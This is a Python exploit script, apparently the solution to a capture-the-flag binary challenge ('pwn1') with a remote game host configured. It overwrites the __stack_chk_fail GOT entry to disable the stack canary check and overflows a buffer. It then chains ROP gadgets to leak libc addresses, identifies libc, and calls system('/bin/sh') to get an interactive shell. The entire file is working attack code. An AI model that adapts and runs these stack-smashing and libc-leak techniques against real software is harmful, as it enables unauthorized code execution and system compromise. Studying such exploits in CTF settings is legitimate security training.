import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=True,
    file='./pwn1',
    remote='redirect.do-not-trust.hacking.run:10461',
))
s = sgtlibc.Searcher()
# load target and show its checksec
elf = sgtlibc.ROPgadgets.ELF(client.tube_file)
pops = elf.get_rop()
print(pops)
main_addr = 0x0040090B
buf_length = 264 + 8
puts_plt = elf.plt['puts']

stk_chk = elf.got['__stack_chk_fail']


def edit_addr_value(addr: int, value: bytes):
    sla('your choice', '0')
    sla('address:\n', str(addr))
    sa('content:\n', value)

def edit_buf_value(length: int, value: bytes):
    sla('your choice', '1')
    sla('size:\n', str(length))
    sa('content:\n', value)

def program_exit():
    sla('your choice', '2')

edit_addr_value(stk_chk, p64(pops['ret']))

def leak(target: str):
    puts_got = elf.got[target]
    payload = b'a' * buf_length + p64(0xdeadbeef)
    payload += p64(pops['rdi']) + p64(puts_got) + \
        p64(puts_plt) + p64(main_addr)
    edit_buf_value(len(payload), payload)
    program_exit()  # 触发溢出
    rl()
    libc_puts_addr = u64(rc(7)[:-1].ljust(8, b'\0'))
    print('target', target, hex(libc_puts_addr))
    s.add_condition(target, libc_puts_addr)
    return libc_puts_addr


puts_got = leak('puts')
leak('read')
leak('__libc_start_main')
leak('setvbuf')
leak('atoi')

data = s.dump(db_index=0)

offset = puts_got - data['puts']
print('puts_got', hex(puts_got))
print('offset', hex(offset))
libc_system = data[sgtlibc.s_system] + offset
libc_binsh = data[sgtlibc.s_binsh] + offset
pause()
payload = b'b' * buf_length + p64(0xdeadbeef)
payload += p64(pops['rdi']) + p64(libc_binsh)
payload += p64(libc_system)
edit_buf_value(len(payload), payload)
program_exit()  # 触发溢出

interactive()
